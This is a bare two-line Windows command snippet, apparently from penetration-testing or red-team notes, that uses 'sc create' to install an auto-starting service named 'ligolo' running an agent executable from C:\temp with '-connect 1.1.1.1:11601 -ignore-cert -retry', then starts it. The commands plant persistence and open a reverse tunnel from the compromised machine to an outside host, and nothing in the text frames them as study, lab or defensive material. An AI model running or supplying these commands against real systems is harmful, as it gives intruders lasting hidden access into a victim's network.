sc create ligolo binPath= "C:\temp\agent_svc.exe -connect 1.1.1.1:11601 -ignore-cert -retry" DisplayName= "ligolo" start= auto
sc start ligolo
